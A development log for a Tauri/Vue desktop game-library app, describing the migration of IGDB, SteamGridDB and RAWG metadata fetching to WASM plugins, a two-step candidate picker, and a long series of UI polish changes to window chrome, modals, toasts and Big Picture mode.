  - **Metadata WASM support didn't exist at all.** Added a third independent `bindgen!` world, `metadata-plugin-world` (`interface metadata-plugin { record metadata-result {...}; fetch-metadata: func(title) -> result<option<metadata-result>, string>; }`), a third `Host` impl block in `wasm_plugins.rs`, and `wasm_plugin_runtime.rs` gained `instantiate_metadata`/`instantiate_metadata_from_paths` + a new `wasm_plugin_fetch_metadata` Tauri command mirroring the source/wrapper pattern exactly. `loader.ts` gained `createWasmMetadataProviderPlugin`, and `"metadata"` was added to `WASM_SUPPORTED_KINDS` and `plugin_installer.rs`'s `SUPPORTED_WASM_KINDS`/`detect_kind` so metadata-kind manifests install by URL through the same universal flow as source plugins
  - **No way for a WASM plugin to collect user config.** TS plugins solve this with a `settingsComponent` (e.g. IGDB's own form); WASM plugins had nothing equivalent. Rather than build one-off UI per plugin, `plugin.json` gained an optional `settingsSchema: {key, label, type}[]` (`WasmPluginManifest` on the Rust side, `#[serde(default)]` since most plugins - Steam/GOG/Epic/LR/LE - don't need it), and a new generic `WasmPluginSettingsForm.vue` renders whatever fields a plugin declares, writing to the same `plugin:<id>:<key>`-namespaced `settings` rows the WASM guest already reads via `settings-get` - the frontend writes those rows directly (bypassing WASM entirely, since it's just a key-value read/write), so a plugin reads back whatever got saved with zero extra wiring
  - `MetadataResult` (TS) and IGDB metadata previously only carried description/releaseDate/genres - extended with optional `coverArtUrl`/`backgroundArtUrl` so SteamGridDB (art-only) and IGDB (text-only) can both be ordinary `MetadataProviderPlugin`s merged the same way by `metadataProviders.fetchMetadata` (first-non-null-wins per field, already-established policy, just extended to two more fields)
  - `sgdb-metadata-wasm-plugin`/`igdb-metadata-wasm-plugin`: new separate repos, same shape as the source-plugin ports. Verified for real in stages - first the no-API-key error path (staged the real compiled `.wasm`, instantiated it against the actual `metadata-plugin-world` runtime via a temp test, confirmed the `settings-get`/error-propagation plumbing works end to end), then against real live credentials (a real SteamGridDB key, real Twitch client id/secret) fetching real cover art and real IGDB metadata
  - GameCard's dedicated "Fetch Cover Art" button (and `GameListRow`'s, and `BrickBlockGameCard`'s) removed once `fetchMetadata` started returning art fields too - one button now covers both text and image metadata, matching how multi-provider merging already worked for text. `library.ts`'s `fetchCoverArt`/`fetchingCoverFor` deleted as dead code once nothing called them
  - Built-in `sgdb.rs`/`igdb.rs`/`src/plugins/igdb/` retired once both WASM versions were confirmed working for real - `EditGameModal`'s dedicated background-art-only "Fetch" button was repointed to go through `metadataProviders.fetchMetadata` (extracting just `backgroundArtUrl`) instead of the old SteamGridDB-specific command, rather than being removed, since it's a genuinely different, still-useful UX (refresh background art without leaving the edit modal). The old built-in `SteamGridDbSettings.vue` (inline SGDB key field) and `library.ts`'s `sgdbApiKey`/`saveApiKeys`/`SGDB_API_KEY_SETTING` were deleted entirely - superseded by the new plugin's own `settingsSchema`-driven form. `metadataProviders.ts`'s `DEFAULT_PROVIDER_IDS` (previously `["igdb"]`, the built-in TS plugin) reset to empty - neither provider is bundled at build time anymore, both are runtime-installed WASM plugins with no guaranteed-present default the way the old built-in was

(Locale Remulator/Locale Emulator's WASM migration moved into Milestone 10, to run alongside their managed-install work instead of as a separate later pass.)

## Milestone 14.5 — UI Polish (Continuous, ongoing)
Current UI was a single flat top-to-bottom stack (settings panels, forms, and grid all visible on one scrolling page) using the OS's default title bar and largely unstyled form controls - read as a webpage, not a desktop app. This milestone reworks visual structure/chrome for both Desktop UI and Big Picture without changing underlying functionality. This milestone doesn't close - UI polish is open-ended by nature; new items get appended in place in milestones.md. Originally numbered Milestone 9, sequenced between the WASM-adoption milestone (then 8.5, since renumbered to 9) and the LR/LE managed-install milestone (10); renumbered 14.5 once 1.0.0 shipped, since an ongoing, never-closing milestone doesn't belong inside the closed core roadmap's numbering.

- Custom window chrome — `decorations: false` in `tauri.conf.json`, `TitleBar.vue` replaces the default OS title bar
  - Drag region via `data-tauri-drag-region`; minimize/maximize-restore/close via `getCurrentWindow()`. Maximize icon toggles based on `isMaximized()`, refreshed via `onResized`
  - Rendered in `App.vue` only when `!bigPicture` - Big Picture's own fullscreen mode has no window chrome to replace, and OS-level edge-resize still works (only the drawn chrome was removed, not resizing)
  - Needed new `core:window:allow-minimize`/`allow-toggle-maximize`/`allow-close`/`allow-is-maximized`/`allow-start-dragging` capabilities - the drag region's internal `start_dragging` invoke is gated by its own separate permission from minimize/maximize/close, missed on the first pass (buttons worked, dragging silently didn't, until `allow-start-dragging` was added)
  - Icons via `@tabler/icons-vue` (MIT, tree-shakeable per-icon components, no CSS/theming opinions bundled in - doesn't fight the hand-rolled CSS-variable theme system the way a full component library would've) rather than unicode glyphs, for the titlebar controls and the sidebar's gamepad-connected badge
  - Verified in a running app: dragging, minimize, maximize/restore, and close all work correctly; icons render and are sized/aligned well
- Navigation shell — `NavSidebar.vue` splits Library (`AddGameForm`/`GameFilters`/`GameGrid`or`GameList`) and Settings (`AppSettings`/`SteamGridDbSettings`/`PluginSettings`) into separate views, toggled via `activeView` in `App.vue` rather than always-visible-stacked. `ErrorBanner` and `EditGameModal` stayed outside the view switch. Gamepad badge + Big Picture button moved into the sidebar itself. Layout is a fixed-height flex column (`TitleBar` + flex `app-shell`) with only `.content` scrolling internally. Needed a global `html`/`body`/`#app` margin reset in `App.vue` - the browser's default `body` margin was creating an outer page scrollbar around the fixed-height layout. Verified in a running app
- Grid/list view toggle redesigned as a single icon button (`IconLayoutGrid`/`IconList` from `@tabler/icons-vue`) next to the search bar in `GameFilters.vue`, replacing the old two-button toggle that lived separately in `App.vue`. Icon shown is the mode a click would switch *to* (shows the list icon while in grid mode, and vice versa)
- Collapsible sidebar — button on the left of `TitleBar` (`IconLayoutSidebarLeftCollapse`/`IconLayoutSidebarLeftExpand` from `@tabler/icons-vue`) toggles `sidebarCollapsed` in `App.vue`, which conditionally renders `NavSidebar` (`v-if`)
  - Slide animation — `<Transition name="sidebar">` wraps `NavSidebar` in `App.vue`; `.sidebar-enter-active`/`-leave-active` transition `width`/`padding`/`opacity` together (defined in `NavSidebar.vue`'s own scoped style, since transition-generated classes apply to the component's root element). `.sidebar` needed `overflow: hidden` added so its content doesn't spill out while shrinking. An icon-only collapsed rail (vs. fully hidden) would be a further refinement, not done
- Themed scrollbars for desktop mode — global `scrollbar-width`/`scrollbar-color` (Firefox) + `::-webkit-scrollbar`/`-track`/`-thumb` (Chromium/WebView2, what Tauri uses on Windows) rules in `App.vue` using the Catppuccin variables (`--color-surface1` thumb, `--color-base` track, `--color-accent` on hover) instead of the OS-default scrollbar. Big Picture's existing scoped scrollbar-hiding rules in `BigPictureGrid.vue` still win there on selector specificity, so this only affects desktop mode as intended
- Further sidebar/titlebar rework: `AddGameForm.vue` converted from an always-visible inline form into a modal (`open`/`close` prop-emit, same backdrop pattern as `EditGameModal`), triggered by an "Add Game" button (`IconPlus`) in the sidebar rather than sitting permanently in the Library view's content. Removed the "Game Library" brand text from `NavSidebar` (redundant with `TitleBar`'s own title). Moved the "Big Picture Mode" button out of the sidebar into `TitleBar`, next to the sidebar-collapse button, as an icon-only button (`IconDeviceTv`) instead of a text button
- Design token pass — spacing (`--space-1..6`), border-radius (`--radius-sm/md/lg`), and shadow (`--shadow-sm/md/lg`) scales added to `App.vue`'s `:root` alongside the existing Catppuccin color variables, plus a `box-sizing: border-box` reset. Global base styles for raw `button`/`input`/`textarea`/`select` (checkbox/radio explicitly excluded from the input styling so native rendering is preserved) give every desktop component a consistent look for free - confirmed by reading through `GameCard`/`GameListRow`/`PluginSettings`/`SteamGridDbSettings`/`AddGameForm`/`EditGameModal` first that none of them had any button/input appearance styling of their own beyond layout, only relying on unstyled browser UA chrome, so the global base applies cleanly everywhere with no conflicts. `button[type="submit"]` gets accent-colored primary styling, distinguishing primary actions (Save/Add) from secondary `type="button"` ones (Cancel) automatically. `TitleBar.vue`'s `.titlebar-button` needed explicit `padding: 0; border-radius: 0;` overrides, since its fixed 46px-square icon-button layout would've broken under the new global button padding/radius - the only component that needed a conflict fix
- `GameCard`/`GameListRow`'s Play/Edit/Remove buttons switched from text labels to icon-only (`IconPlayerPlay`/`IconEdit`/`IconTrash` from `@tabler/icons-vue`), with `title` attributes preserving an accessible/hover label. "Fetch Cover Art"/"Fetch Metadata" buttons kept as text, not in scope for this change
- `GameCard` hover redesign — default view is cover-art-only (title/description/release-date/playtime text removed from the always-visible card, per explicit choice over keeping title always visible); all 5 action buttons moved into a `.footer` bar that slides up from the bottom on hover (`translateY(100%)` → `translateY(0)`); card scales up slightly on hover (`transform: scale(1.06)`); a tooltip-style `.balloon` (title + playtime, small triangle pointer) fades in above the card on hover. Judgment call made during implementation: also converted "Fetch Cover Art"/"Fetch Metadata" to icon-only (`IconPhoto`/`IconInfoCircle`) here, since 5 buttons including two long text labels don't fit in a compact slide-up footer over a ~140-200px card - flagged to the user rather than silently changing scope. `GameListRow` (list view) untouched - this hover treatment is specific to the grid card
  - Fix: balloon needs to flip below the card when the card's top edge is scrolled out of view (no room to show it above). Balloon is teleported to `<body>` (`<Teleport to="body">`) and positioned `fixed` from the card's own `getBoundingClientRect()` computed on `mouseenter`; `placement` is `"below"` when `rect.top < 60px`, else `"above"` - `.balloon-above`/`.balloon-below` swap both the `transform` offset and the pointer-triangle's edge (pointing down vs. up) so the arrow always points back at the card
- Toast/notification system replacing the plain-text `ErrorBanner` for errors and confirmations (e.g. "scan complete: 3 added, 1 merged")
  - New `useToastStore` — bottom-right stack, auto-dismiss after 5s, click-to-dismiss, `TransitionGroup` fade+slide, `error`/`success`/`info` variants
  - `library.ts`'s `error` ref removed entirely - every `error.value = ...` call site (`fetchMetadata`/`fetchCoverArt`/`fetchBackgroundArt`/`addGame`/`launchGame`) now pushes an error toast instead
  - `plugins.ts`'s `lastScanSummary` (previously shown inline in `PluginSettings`, only visible while on that settings tab) removed the same way - scan completion pushes a success toast, scan failure/no-plugins-enabled push error toasts, visible regardless of which view is active
  - `ErrorBanner.vue` deleted; `ToastContainer` mounted once at the top level of `App.vue` (outside both the desktop and Big Picture branches) so toasts surface in either mode
  - Modal-local validation errors (`AddGameForm`/`EditGameModal`'s "Title and executable path are required") deliberately left as inline `<p>` text, not toasted - field-validation errors read better next to the field than in a corner-anchored notification
- Empty/loading states — placeholder for an empty library, skeleton loaders for grid/list while a scan or metadata fetch is in flight
  - `SkeletonCard.vue`/`SkeletonRow.vue` (shimmer animation via a moving gradient) render in `GameGrid`/`GameList` while `plugins.scanning` is true
  - Empty state distinguishes a genuinely empty library (`library.games.length === 0`: `IconInboxOff` + "Add a game or scan a source plugin to get started") from filters/search excluding everything ("No games match your search/filters") - previously both cases showed the same generic text
  - Per-card fetch-in-progress indicator added to `GameCard` (`IconLoader2` + CSS `spin` animation, overlaid on the cover) - needed once "Fetch Cover Art"/"Fetch Metadata" became icon-only buttons with no text to show a "Fetching..." state; `GameListRow` already shows textual `"..."` during fetch so was left as-is
- Modal polish — `EditGameModal` transition/animation, focus trap, click-outside/Escape-to-close consistency
  - New shared `BaseModal.vue` (backdrop, `<Transition name="modal">` fade+scale, focus trap, Escape-to-close, click-outside via existing `@click.self`) extracted rather than duplicating this logic across modals - two real instances (`EditGameModal`, `AddGameForm`) justified the extraction. Takes `open`/`max-width` props and a `close` emit; parent still owns its own visibility state
  - Focus trap: on open, focuses the first focusable element inside the modal and cycles Tab/Shift+Tab within it (queries `a[href], button, textarea, input, select, [tabindex]`, excluding disabled ones)
  - `EditGameModal`/`AddGameForm` each kept their own `v-if="library.editingGame"`-style narrowing inside the slot content (redundant with `BaseModal`'s internal `v-if="open"` at runtime, but needed so `vue-tsc` can still narrow `library.editingGame` from nullable across the component boundary)
  - Box styling (background/padding/border-radius/width/max-height) moved from each modal's own `.modal` class into `BaseModal`'s `.modal-frame` (now the single owner of modal chrome); each modal's remaining scoped styles renamed `.modal` → `.modal-body`
- Big Picture visual pass — apply the same design tokens, add tile focus/selection transitions consistent with the new desktop chrome
  - `BigPictureTile.vue` now uses `--radius-lg`/`--radius-md` instead of hardcoded `12px`/`10px`, and gains a `--shadow-lg` glow on the focused tile (console-style "lifted" highlight) alongside the existing accent border/scale; transition timing aligned to `0.15s ease` matching `GameCard`'s hover transition
  - `BigPictureGrid.vue`'s tile gap uses `--space-6` instead of a hardcoded `2rem`; empty-library state now matches the desktop empty state's pattern (`IconInboxOff` + message, was plain text)
  - Big Picture's dark, theme-independent background/text colors (`#111`/`#fff`/`#444`) deliberately left as literals, not converted to Catppuccin CSS variables - the console aesthetic is intentionally fixed-dark regardless of the active light/dark theme, an existing decision from earlier in the project. Same reasoning for `.big-picture`'s `3rem` outer padding, which doesn't cleanly map onto the `--space-*` scale
- Big Picture slideshow view — new selectable view mode alongside the existing tile grid (toggle, like desktop's grid/list). Full-bleed background art of the selected game as backdrop, cover-art strip pinned to the bottom with the selected cover centered and 3 neighbors visible on each side (7 visible at once), gamepad/keyboard nav shifts the centered selection left/right through the library
  - New `BigPictureSlideshow.vue`, toggled against the existing `BigPictureGrid.vue` via `bigPictureViewMode` in `App.vue` (`IconSlideshow`/`IconLayoutGrid` button next to Exit, mirrors the desktop grid/list toggle's "icon shows the mode you'd switch to" convention) - not persisted across Big Picture sessions, unlike desktop's `viewMode` which is
  - 1D linear nav reuses `useGamepadNav` rather than hand-rolling equivalent logic - passing `columns: () => library.games.length` makes its movement math degenerate into a plain left/right list (up/down never trigger since `columns` is always ≥ the current index)
  - Cover strip renders ±3 neighbors around the centered index with distance-based `scale`/`opacity` falloff (coverflow-style), centered cover gets an accent border + `--shadow-lg` glow; clicking a non-centered cover re-centers on it, clicking the centered one launches
  - Fix: near the first/last game, the strip has fewer real neighbors on one side, and `justify-content: center` was centering that shorter row instead of the selected cover - fixed by always rendering exactly 7 slots (offsets -3..3) and filling out-of-range ones with an inert `.strip-cover-dummy` placeholder (`visibility: hidden`, `pointer-events: none`, same box size) instead of omitting them
  - Reuses the same backdrop crossfade pattern as `BigPictureGrid` (`<Transition name="backdrop-fade">` keyed on the background art URL) and the same dark, theme-independent console colors
  - No theme-slot integration for this view (no `useThemeSlot` call) - the milestone item didn't call for theme-plugin overrides of the new slideshow, and `BigPictureGrid`'s existing `BigPictureTile` slot is unaffected/untouched

### Backlog
- Metadata provider `metadata-plugin` WIT interface redesigned around a two-step search/fetch split, replacing the single `fetch-metadata(title)` export - grew directly out of the Milestone 11 RAWG bug (wrong-game match), where the user's own proposed fix ("if more than one matches the exact same name, show me candidates to choose; if none, leave blank") needed real plugin-to-host infrastructure, not just a smarter default inside one plugin
  - New `metadata-candidate` record (`id`, `label`) plus `search-candidates(title) -> list<metadata-candidate>` and `fetch-metadata-by-id(id) -> option<metadata-result>`, replacing `fetch-metadata(title)` entirely in `wit/plugin.wit` across the host and all three existing metadata plugin repos (IGDB/SteamGridDB/RAWG) - a breaking WIT change, so all three bumped `0.1.x` → `0.2.0` (pre-1.0, so a WIT/manifest-breaking change bumps minor rather than major per the project's own versioning convention)
  - Host side: `wasm_plugin_runtime.rs`'s `wasm_plugin_fetch_metadata` command split into `wasm_plugin_search_candidates`/`wasm_plugin_fetch_metadata_by_id`, new `WasmMetadataCandidate` DTO. No `host` interface changes needed - only the plugin-exported `metadata-plugin` interface changed, so `wasm_plugins.rs`'s `Host` trait impls were untouched
  - `MetadataProviderPlugin` (TS): `fetchMetadata(title)` replaced with `searchCandidates(title)`/`fetchMetadataById(id)`, mirroring the WIT split; new `MetadataCandidate` type. `loader.ts`'s `createWasmMetadataProviderPlugin` updated to call the two new Tauri commands
  - Revised after first real use: rather than pausing once per ambiguous provider (a separate modal each time), `fetchMetadata` now runs in two explicit phases. Phase 1 calls `searchCandidates` on every enabled provider up front and toasts each provider's own outcome as it lands (`"IGDB: found a match."` / `"SteamGridDB: no match found."` / `"RAWG: 2 matches found."` / a `search failed` error toast if the call throws) - visibility into what's happening per-provider was missing before and the user asked for it directly. Providers with 0 or 1 candidates resolve immediately, no interruption. Phase 2, only if at least one provider came back with 2+ candidates, shows exactly ONE combined `CandidatePicker.vue` with one section per ambiguous provider rather than one modal per provider - `chooseCandidate`/`skipCandidatePrompt` collapsed into a single `submitCandidateSelections(selections: Record<pluginId, id|null>)` call. `chosenIds` stays index-aligned with `loadedPlugins` across both phases specifically so a late-resolved ambiguous provider still merges at its original priority position (not appended after every already-resolved provider) - first-non-null-wins merge order has to survive the pause for user input
  - New `metadata-candidate.image-url: option<string>` (WIT) / `MetadataCandidate.imageUrl?: string` (TS) - the picker shows a thumbnail per candidate when a provider has one, since a bare title string doesn't disambiguate as well as a cover image does. **IGDB** search-candidates now requests `cover.image_id` too, building the thumbnail URL from IGDB's documented `t_thumb` CDN pattern (confirmed the field exists via a real authenticated API call). **RAWG** search-candidates passes through the search response's existing `background_image` field (was already there, just wasn't being read). **SteamGridDB** leaves it unset - confirmed via a real API call that its autocomplete endpoint returns only `id`/`name`/`verified`/`types`/`release_date`, no image; that section just renders as plain text rows
  - `CandidatePicker.vue`: click a candidate row to select it (highlighted via `--color-accent`, click again to deselect - at most one selection per section), footer has one "Continue" button that submits every section's selection (or lack of one, meaning "skip this provider") at once
  - Real testing surfaced two more asks. First, "how does this decide between IGDB and RAWG when both answer" - answered directly rather than changing anything: it's `enabledIds`'s provider-priority order (the reorder UI from the earlier backlog entry), first-non-null-wins per field, nothing automatic beyond that. Second, exact-name-only filtering (RAWG's own fix from the Milestone 11 bug) was IGDB/SGDB-only missing - both still returned raw top-5 relevance/autocomplete results unfiltered, so they popped the picker far more than genuinely necessary. Applied the same `.eq_ignore_ascii_case` filter to both: IGDB's search query widened to `limit 10` (was 5, since filtering can now legitimately drop matches) then filtered by exact `name`; SGDB's `take(5)` cap replaced outright with the same filter (no result-count cap needed once filtered - SteamGridDB's autocomplete already returns a small result set)
  - Followed by "add the same preview-image feature to SGDB too" - unlike IGDB/RAWG, SteamGridDB's autocomplete response genuinely has no image field to just read (confirmed earlier), so `search_candidates` now does one extra `fetch_first_image(&auth, "grids", id)` lookup per candidate after the exact-match filter, reusing the same grids-image helper `fetch_metadata_by_id` already had. Only after filtering, not per raw autocomplete result, keeps the extra-calls cost to a handful at most; a candidate whose image lookup fails or comes up empty (`.ok().flatten()`) still gets listed without a thumbnail rather than being dropped - a missing preview image isn't a reason to hide an otherwise-valid candidate
  - Each plugin's search/fetch split, briefly: **IGDB** - `search-candidates` runs the existing Apicalypse `search` query for `name,cover.image_id` (was `summary,first_release_date,genres.name; limit 1`), `fetch-metadata-by-id` runs a `where id = {id}` query for the full text fields; each call re-authenticates against Twitch since a WASM instance is stateless/per-call, no token cache available. **SteamGridDB** - `search-candidates` now also reads the autocomplete response's `name` field (previously only `id`), `fetch-metadata-by-id` is the original grids/heroes image lookup unchanged, just keyed off a passed-in id instead of a freshly-searched one. **RAWG** - `search-candidates` filters results down to only exact case-insensitive `name` matches (per the user's explicit ask - a non-exact match never becomes a candidate at all, not even a fallback), and appends the release year to `label` when needed, since two RAWG listings can share the literal same name (a real possibility for remasters/reissues) and the picker needs *something* to tell them apart; `fetch-metadata-by-id` collapsed to one detail-endpoint call (confirmed for real that `/api/games/{id}` alone has `description_raw`/`released`/`genres`, no separate search-result stashing needed)
- Brick Block theme's pixel font swapped from Galmuri11 (CDN, `cdn.jsdelivr.net`) to a bundled local font - the CDN `<link>` triggered a WebView2 "Tracking Prevention blocked access to storage" console warning on every launch (benign - the font itself still loaded, only its HTTP cache entry got dropped - but a real dependency on network access at app launch for a theme's font was worth removing anyway). Replaced with [Fusion Pixel Font](https://github.com/TakWolf/fusion-pixel-font)'s 12px proportional Korean build (`fusion-pixel-12px-proportional-ko.otf.woff2`, OFL 1.1) - verified via a real `fontTools` cmap inspection (not assumed from the repo's own ambiguous docs) that the `ko`-suffixed file already covers basic Latin/ASCII on its own (36,518 mapped glyphs total), so no separate Latin file + `unicode-range` split was needed, just the one file. Bundled under `src/plugins/brick-block-theme/` and imported via Vite's `?url` suffix so it gets fingerprinted/hashed into the build like any other asset; `injectFont()`/`removeFont()` now inject/remove a `<style>` with a `@font-face` block (using the font's real internal family name, `Fusion Pixel 12px Prop ko`, confirmed via the same `fontTools` inspection) instead of a `<link>` to an external stylesheet. `FUSION-PIXEL-OFL.txt` (the font's own OFL license) copied in alongside for compliance
- API-key/settings forms moved from inline-under-the-plugin-row into a modal, and GameCard's dedicated "Fetch Cover Art" button folded into the unified "Fetch Metadata" flow - both grew out of the SGDB/IGDB WASM plugin work (Milestone 9), not scheduled UI polish on their own
  - IGDB's own form, the new generic `WasmPluginSettingsForm.vue` (WASM plugins' declared `settingsSchema`), and the old built-in `SteamGridDbSettings.vue` all sat permanently visible inline before this - a new `SettingsFormModal.vue` (later renamed, see below) wrapped each behind a "Settings" trigger button instead. `InstallableStatus.vue`'s Install/Uninstall toggle deliberately stayed inline - hiding an at-a-glance status behind a click would be a regression, not requested
  - GameCard/BrickBlockGameCard/GameListRow's separate cover-art button removed once `metadataProviders.fetchMetadata`'s merge started returning `coverArtUrl`/`backgroundArtUrl` too (any enabled provider can contribute either field, first-non-null-wins, same as description/releaseDate) - `library.ts`'s `fetchCoverArt`/`fetchingCoverFor` deleted as genuinely dead code once nothing called them. `EditGameModal`'s separate background-art-only "Fetch" button (still calling the old built-in `sgdb.rs` path directly) was left untouched - different UI surface, not part of what was agreed to change
  - Consolidated further on request: all modal-form components (`AddPluginModal`/`ConfirmInstallModal`/`SettingsFormModal`/`EditGameModal`, plus `AddGameForm.vue` which had never been migrated and still hand-rolled the same `<h2>`+layout pattern) moved under `src/components/desktop/modalForms/`. Introduced a `Modal.vue` wrapper (`BaseModal` + title/layout chrome) to kill the duplication first, then - once every single consumer turned out to want that chrome, meaning the two-layer split had exactly one real caller - merged `Modal.vue`'s title prop directly into `BaseModal.vue` and deleted `Modal.vue`, per the user's own read that keeping two layers for one caller was overhead rather than earned separation. Files renamed to drop the now-redundant "Modal"/"Form" suffix once inside a folder already named `modalForms` (`AddPluginModal.vue` → `AddPlugin.vue`, `ConfirmInstallModal.vue` → `ConfirmInstall.vue`, `SettingsFormModal.vue` → `SettingsButton.vue`, `EditGameModal.vue` → `EditGame.vue`, `AddGameForm.vue` → `AddGame.vue`)
  - `WasmPluginSettingsForm.vue` later folded directly into `SettingsButton.vue` too, once the built-in IGDB retirement (see the SGDB/IGDB WASM migration entry above) removed `igdb/index.ts`, its only other consumer with different slotted content - checked via `grep -rln "SettingsButton" src/` before merging, confirming `loader.ts`'s `attachSettingsSchemaForm` was the sole real caller and it always paired `SettingsButton` with this exact form. Same one-real-caller reasoning as the `Modal.vue`/`BaseModal.vue` merge above. `SettingsButton` now owns the schema-driven field rendering and settings-repo load/save directly (`title`/`pluginId`/`schema` props) instead of slotting a separate fields-only component wired through an exposed-`save()` ref
- Priority/reorder UI for source and metadata-provider plugins, prompted by a real gap found while explaining how `metadataProviders.fetchMetadata`'s merge order worked: enable/disable order had never actually controlled fetch/scan sequence - `loadEnabledPlugins` (`loader.ts`) filtered `getAvailablePluginManifests`'s own discovery order by membership in `enabledIds`, so toggling a plugin off and back on (or installing a new one later) silently reshuffled priority with no user control at all
  - `plugins.ts`/`metadataProviders.ts`'s `enabledIds` changed from `Set<string>` to an ordered `string[]` (membership via `indexOf`/`includes` instead of `.has`/`.add`/`.delete`); persisted format unchanged (still a JSON array in the `settings` table). New `movePlugin`/`moveProvider(id, direction)` actions splice-and-reinsert. `wrapperPlugins.ts` deliberately left on `Set` - no merge-priority semantics there (a game picks one wrapper explicitly, not a first-wins scan)
  - `loadEnabledPlugins` now takes `Iterable<string>` and iterates the caller's own order directly (building an id→manifest map first) instead of filtering manifest-discovery order - this is what actually made the stored order meaningful; a `Set` (wrapper's case) still works since Sets iterate in insertion order too, just with no reorder UI hanging off it
  - `PluginSettings.vue`: new `orderByPriority()` helper renders enabled plugins first in priority order, disabled/uninstalled ones after, with ↑/↓ buttons (disabled at the ends of the enabled range) next to each enabled row. Added a one-line hint above each of the Source/Metadata Provider tabs explaining what the order actually controls (last-plugin-wins on a source scan title collision; first-provider-with-an-answer-wins per metadata field) - the mechanism is genuinely non-obvious without that context, confirmed by the fact this whole feature came out of the user asking exactly that question
  - Fix: the ↑/↓ buttons and a row's optional `settingsComponent` (e.g. `SettingsButton`) were separate flex children on `.plugin-row`, so a row's controls landed in different horizontal positions depending on which of the two were actually present - wrapped both in one `.row-controls span` (`margin-left: auto`, fixed child order) so the control cluster always sits flush right regardless of which pieces exist for that row. Applied to both the Source and Metadata Provider tabs (same underlying markup shape)
  - Fix: loading plugin instances into `PluginSettings.vue`'s five `allXPlugins` maps via `ref()` triggered a real Vue warning ("Vue received a Component that was made a reactive object") - `ref()` deep-reactivizes Map values, including each plugin's `settingsComponent` (a live component definition), and handing a reactive-wrapped component to `<component :is="...">` is exactly what that warning flags. Switched all five to `shallowRef` - they're only ever swapped wholesale in `onMounted`, never mutated field-by-field, so no deep reactivity was ever needed
- Big Picture tile title hidden by default, reveals on hover/selection. First pass used a plain `opacity: 0`/`1` toggle on `.tile-title`, which left the parent `.tile`'s flex `gap` (and the title's own line-height) still reserving layout space below every tile at all times - not what was asked. User corrected: normal tiles should show cover/placeholder *only*, with the title appearing below the tile on hover/selection, not just fading in place. Reworked to collapse the title's box to zero instead of just its opacity: removed `.tile`'s `gap` entirely (moved that spacing onto the title's own `margin-top`), and `.tile-title` now sits at `max-height: 0; margin-top: 0; opacity: 0; overflow: hidden`, animating open to `max-height: 3rem; margin-top: var(--space-3); opacity: 1` on `.tile:hover`/`.tile.bp-cover-focused` (the latter reusing the existing class already bound to the `focused` prop, so keyboard/gamepad selection reveals the title the same way mouse hover does). `bun run build`/`cargo check` both clean.
  - **Second correction, from actually seeing it run:** growing `.tile-title` in flow (even from zero) still grew that one tile's own box on hover, which in a CSS grid stretches every other tile sharing its row to match - visible row-height jumps whenever any tile in a row was hovered. User's actual ask: don't expand the tile at all - shift the whole tile upward a little and reveal the title *outside* it. That also collided with `.bp-cover-frame`'s `overflow: hidden` (added earlier this milestone specifically so AST-rendered cover content clips correctly) - a title positioned outside the frame's own box would get clipped by that same `overflow: hidden` if it stayed the frame's own child. Restructured `BigPictureTile.vue`'s template to split the concern: a new inner `.tile-frame` div (carrying `bp-cover-frame`/`bp-cover-focused`, i.e. the clipping/border/scale-up) wraps just the cover/placeholder content, while the outer `<button class="tile">` (unclipped, `position: relative`) holds `.tile-frame` and `.tile-title` as siblings. `.tile-title` is now `position: absolute; top: 100%` - out of flow entirely, so it never affects this tile's own layout height or any sibling's grid row. Reveal is now a `transform: translateY(-0.6rem)` on the whole `.tile` (lifting frame+title together as one rigid unit, driven by `:hover`/a new `.tile-selected` class since `bp-cover-focused` moved to the inner frame) plus a plain opacity fade on the title itself - the frame's own `scale(1.05)` focus-zoom stayed on `.tile-frame` specifically, unchanged. Verified via compiled CSS: `.tile[data-v-*]` carries `position:relative` and the lift transition, `.tile-frame[data-v-*]` keeps its own transform/border-color/box-shadow transition, `.tile-title[data-v-*]` compiles with `position:absolute;top:100%`. `bun run build`/`cargo check` both clean.
- Long titles ellipsis instead of bleeding into neighbors. Since `.tile-title` is absolutely positioned (out of flow), a title longer than the tile's own column width was never clipped or wrapped by anything - it just overflowed visually across whatever sat next to it. Added `white-space: nowrap; overflow: hidden; text-overflow: ellipsis` directly to `.tile-title`. Verified via compiled CSS.
- **Fixed keyboard/gamepad focus fighting the mouse cursor.** `BigPictureGrid.vue`'s `@hover="focusedIndex = index"` trusted every `mouseenter` DOM event as a real hover - but a `mouseenter` also fires whenever the *element itself* moves under a stationary cursor (exactly what the tile's own focus-lift `translateY` does, plus the grid's `scrollIntoView` smooth-scroll), not only when the cursor physically moves. Net effect: navigating with a keyboard or gamepad could silently snap focus back to whatever tile the (unmoved) mouse cursor happened to be sitting over the instant the layout shifted underneath it - a real fight between two input methods, not a hypothetical.
  - Fix: added `src/composables/useMouseActivity.ts`, a module-level singleton `mouseActive` ref updated `true` only by a real `window` `mousemove` listener (this event genuinely never fires from an element moving under a stationary cursor, unlike `mouseenter`/`mouseleave`), plus a `suppressMouseActivity()` setter.
  - `useGamepadNav.ts`'s `move()` and `BigPictureGrid.vue`'s own `onKeydown` arrow-key branches both call `suppressMouseActivity()` immediately before mutating `focusedIndex` - marking the mouse "not really moving" until a genuine `mousemove` proves otherwise. The grid's hover handler (renamed `onTileHover`) now checks `mouseActive.value` before honoring a `mouseenter`-driven focus change, so a phantom `mouseenter` fired right after a keyboard/gamepad move is ignored, while real mouse movement (which always fires `mousemove` first) clears the flag and hover works normally again.
  - Kept as a module-level singleton rather than component state or a prop - there's exactly one physical mouse and one active Big Picture view, so this avoids threading the flag through `BigPictureGrid.vue` → `useGamepadNav` as an option/callback for no real benefit. `BigPictureSlideshow.vue` doesn't need the same fix - its own focus changes are driven by `@click`, not hover, so no such ambiguity exists there.
  - `bun run build`/`cargo check` both clean.
- Moved the desktop library's scrollbar off `App.vue`'s `.content` shell onto `GameGrid.vue`/`GameList.vue` themselves, per user request - the scrollbar previously sat at the edge of the whole content area (GameFilters included), rather than next to the game list/grid it actually scrolls.
  - `.content` stopped being the scroll container: `overflow-y: auto` replaced with `display: flex; flex-direction: column; overflow: hidden`, and its bottom padding dropped (moved into whichever child now owns the scroll, so it stays visible below the last row instead of sitting outside the scrollable area as dead space).
  - `GameGrid.vue`'s `.grid` and `GameList.vue`'s `.list` each gained `flex: 1; min-height: 0; overflow-y: auto; padding-bottom: var(--space-5)` - sized to whatever space is left below `GameFilters.vue` within `.content`'s flex column, each scrolling independently.
  - `GameFilters.vue`'s `.filters` gained `flex-shrink: 0` so it keeps its natural height as a flex sibling rather than getting compressed.
